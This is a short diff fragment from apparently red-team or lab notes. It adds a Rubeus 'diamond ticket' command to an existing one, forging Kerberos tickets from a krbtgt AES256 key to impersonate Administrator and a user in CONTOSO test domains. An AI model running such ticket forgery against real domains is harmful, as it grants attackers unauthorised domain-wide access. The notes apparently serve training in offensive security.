@@ -20,6 +20,8 @@ cce3f72b3b4bcffe0af7979588b885b6
 Use AES256 hash of the `krbtgt` account to create a diamond ticket
 ```powershell
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /krbkey:512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c /ticketuser:Administrator /ticketuserid:500 /domain:CONTOSO.COM /nowrap
+
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /krbkey:ab41d2c550af7cc84b40fd3b69daeab67e1662f7bf662fd1572dd1fa9e949a56 /ticketuser:nwallace /ticketuserid:4102 /domain:DUBLIN.CONTOSO.COM /nowrap
 ```
 
 > **From the high-integrity Beacon**:
